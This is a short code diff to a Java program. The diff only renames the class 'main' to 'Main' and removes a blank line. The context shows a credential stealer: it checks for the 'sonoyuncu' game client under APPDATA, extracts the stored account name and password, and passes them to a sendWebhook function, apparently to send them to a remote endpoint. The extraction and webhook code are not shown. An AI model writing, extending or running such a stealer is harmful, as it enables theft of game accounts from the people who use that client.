@@ -20,7 +20,7 @@ import java.util.List;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-public class main {
+public class Main {
 
     private static final String APP_DIR = System.getenv("APPDATA") + "\\" + ".sonoyuncu" + "\\";
     private static final String APP_PATH = APP_DIR + "sonoyuncuclient.exe";
@@ -35,11 +35,10 @@ public class main {
 
     public static void main(String[] args) {
         if (new File(APP_PATH).exists()) {
-            main extractor = new main();
+            Main extractor = new Main();
             String[] credentials = extractor.extractAccount();
             if (credentials==null)
                 return;
-            
             sendWebhook(credentials[0], credentials[1]);
         } else {
             System.out.println("Application not found: " + APP_PATH);
